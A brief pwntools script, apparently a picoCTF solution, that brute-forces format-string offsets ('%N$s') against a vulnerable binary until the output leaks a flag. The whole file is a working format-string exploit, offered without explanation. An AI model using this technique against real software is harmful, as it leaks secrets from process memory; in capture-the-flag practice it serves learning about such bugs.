from pwn import *

#r = process('./vuln')
#r = remote('saturn.picoctf.net', 59516)

for i in range (65):
	r = process('./vuln')
	r.sendline('%' + str(i) + '$s')
	reponse = r.recv()
	
	if b'FLAG' in reponse:
		print(i, reponse)
		break
	print(i, reponse)
	
#r.sendline(payload)
#r.interactive()
